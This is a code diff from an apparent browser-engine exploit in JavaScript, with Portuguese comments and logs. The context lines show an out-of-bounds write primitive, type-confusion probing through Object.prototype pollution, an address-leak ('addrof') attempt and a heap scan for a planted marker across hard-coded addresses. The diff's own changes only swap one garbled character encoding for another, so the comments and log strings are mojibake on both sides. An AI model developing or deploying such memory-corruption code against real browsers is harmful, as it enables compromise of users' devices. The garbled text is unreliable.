@@ -23,9 +23,9 @@ const PROBE_CALL_LIMIT_V82 = 10;
 
 const SCAN_MARKER_VALUE_R38 = new AdvancedInt64(0x41424344, 0x45464748); 
 const SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R38 = 0x100; 
-// ATEN√á√ÉO: Estes endere√ßos de scan s√£o HIPOT√âTICOS. Aumentar a faixa pode ser necess√°rio.
+// ATEN«√O: Estes endereÁos de scan s„o HIPOT…TICOS. Aumentar a faixa pode ser necess·rio.
 const SCAN_HEAP_START_ADDRESS_R38 = new AdvancedInt64(0x0, 0x8A000000); 
-const SCAN_HEAP_END_ADDRESS_R38 = new AdvancedInt64(0x0, 0x8A020000); // Mantendo faixa pequena (128KB) para teste r√°pido
+const SCAN_HEAP_END_ADDRESS_R38 = new AdvancedInt64(0x0, 0x8A020000); // Mantendo faixa pequena (128KB) para teste r·pido
 const SCAN_STEP_R38 = 0x1000; 
 
 function advInt64LessThanOrEqual(a, b) {
@@ -78,7 +78,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38()
         let heisenbugConfirmedThisIter = false; 
         
         try { 
-            logS3(`  --- Fase 1 (R38): Detec√ß√£o de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
+            logS3(`  --- Fase 1 (R38): DetecÁ„o de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
             await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
             oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
             await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
@@ -94,7 +94,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38()
                     if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                 }else{logS3(` TC Probe R38: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
             }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
-            logS3(`  --- Fase 1 (R38) Conclu√≠da. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
+            logS3(`  --- Fase 1 (R38) ConcluÌda. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
             await PAUSE_S3(100);
 
             logS3(`  --- Fase 2 (R38): Teste de Memory Scan ---`, "subtest", FNAME_CURRENT_ITERATION);
@@ -102,7 +102,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38()
                 try {
                     await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-MemScanSetup` }); 
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-MemScanSetup`)) {
-                        throw new Error("Ambiente OOB n√£o pronto para Memory Scan.");
+                        throw new Error("Ambiente OOB n„o pronto para Memory Scan.");
                     }
                     // Corrigido o log do offset do marcador:
                     logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE_R38.toString(true)} em oob_array_buffer_real[${toHexHelper(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R38)}]...`, 'info');
@@ -135,13 +135,13 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38()
                         }
                         await PAUSE_S3(0); 
                     }
-                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador n√£o encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R38.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R38.toString(true)}.`;
+                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador n„o encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R38.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R38.toString(true)}.`;
                 } catch (e_mem_scan) {
                     iter_memory_scan_result.msg = `MemScan EXCEPTION: ${e_mem_scan.message || String(e_mem_scan)}`;
                     if (!iter_primary_error) iter_primary_error = e_mem_scan;
                 }
             } else { iter_memory_scan_result.msg = "Memory scan: Pulado (TC Fase 1 falhou)."; }
-            logS3(`  --- Fase 2 (R38) Conclu√≠da. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");
+            logS3(`  --- Fase 2 (R38) ConcluÌda. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");
 
         }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R38: ${e_outer.message || String(e_outer)}`, "critical");}
         finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR38`});}
@@ -157,22 +157,22 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R38()
         };
         iteration_results_summary.push(current_iter_summary);
         
-        // <<<< L√≥gica ATUALIZADA para best_result_for_runner (R38) >>>>
+        // <<<< LÛgica ATUALIZADA para best_result_for_runner (R38) >>>>
         let tc_ok_this_iter = heisenbugConfirmedThisIter;
         let scan_successful_this_iter = iter_memory_scan_result.success;
         
-        // Se esta itera√ß√£o teve um scan bem-sucedido, ela √© a melhor.
+        // Se esta iteraÁ„o teve um scan bem-sucedido, ela È a melhor.
         if (scan_successful_this_iter) {
             best_result_for_runner = { ...current_iter_summary };
         } 
-        // Sen√£o, se esta itera√ß√£o teve TC e o 'best_result' atual n√£o tem scan bem-sucedido,
-        // ent√£o esta itera√ß√£o √© a melhor (ou a primeira a ter TC).
+        // Sen„o, se esta iteraÁ„o teve TC e o 'best_result' atual n„o tem scan bem-sucedido,
+        // ent„o esta iteraÁ„o È a melhor (ou a primeira a ter TC).
         else if (tc_ok_this_iter && !best_result_for_runner.memory_scan_result?.success) {
             if (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used ) {
                  best_result_for_runner = { ...current_iter_summary };
             }
         } 
-        // Sen√£o, se √© a √∫ltima itera√ß√£o e nada de bom foi encontrado ainda, pega esta.
+        // Sen„o, se È a ˙ltima iteraÁ„o e nada de bom foi encontrado ainda, pega esta.
         else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
              best_result_for_runner = { ...current_iter_summary };
         }
